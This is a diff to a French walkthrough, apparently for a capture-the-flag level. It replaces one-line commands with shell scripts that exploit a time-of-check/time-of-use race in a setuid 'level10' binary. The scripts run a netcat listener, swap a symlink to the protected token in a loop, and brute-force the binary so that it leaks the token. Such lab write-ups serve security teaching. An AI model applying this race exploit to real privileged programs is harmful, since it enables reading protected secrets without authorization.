@@ -16,26 +16,67 @@ Nous allons exploiter cette fenêtre de temps en utilisant un lien symbolique qu
 
 #### 2.1. Écouter sur le port 6969
 
-Ouvrez un terminal et lancez la commande suivante pour écouter sur le port 6969 :
+Créez un script `start_telnet_server.sh` pour écouter sur le port 6969 :
 
 ```bash
-nc -lk 6969
+#!/bin/bash
+# Telnet server
+
+start_telnet_server()
+{
+    while true; do
+        nc -l 6969
+    done
+}
+start_telnet_server
+```
+
+Rendez le script exécutable et lancez-le :
+
+```bash
+chmod +x start_telnet_server.sh
+./start_telnet_server.sh
 ```
 
 #### 2.2. Créer une boucle pour alterner le lien symbolique
 
-Ouvrez un deuxième terminal et lancez la commande suivante pour créer une boucle qui alterne le lien symbolique entre `level10` et `token` :
+Créez un script `toggle_symlink.sh` pour créer une boucle qui alterne le lien symbolique entre `level10` et `token` :
 
 ```bash
-while true; do ln -fs ~/level10 /tmp/exploit; ln -fs ~/token /tmp/exploit; done
+#!/bin/bash
+# Script to exploit a race condition between access & open.
+
+while true; do
+	ln -sf /tmp/fake_tok /tmp/tok ;
+	ln -sf /home/user/level10/token /tmp/tok ;
+done
+```
+
+Rendez le script exécutable et lancez-le dans un deuxième terminal :
+
+```bash
+chmod +x toggle_symlink.sh
+./toggle_symlink.sh
 ```
 
 #### 2.3. Exécuter `level10` en boucle
 
-Ouvrez un troisième terminal et lancez la commande suivante pour exécuter `level10` en boucle :
+Créez un script `brute_force.sh` pour exécuter `level10` en boucle :
 
 ```bash
-while true; do ~/level10 /tmp/exploit localhost; done
+#!/bin/bash
+# Random Brute force
+
+while true; do
+	/home/user/level10/level10 /tmp/tok 127.0.0.1 ;
+done
+```
+
+Rendez le script exécutable et lancez-le dans un troisième terminal :
+
+```bash
+chmod +x brute_force.sh
+./brute_force.sh
 ```
 
 ### 3. Identifier le mot de passe
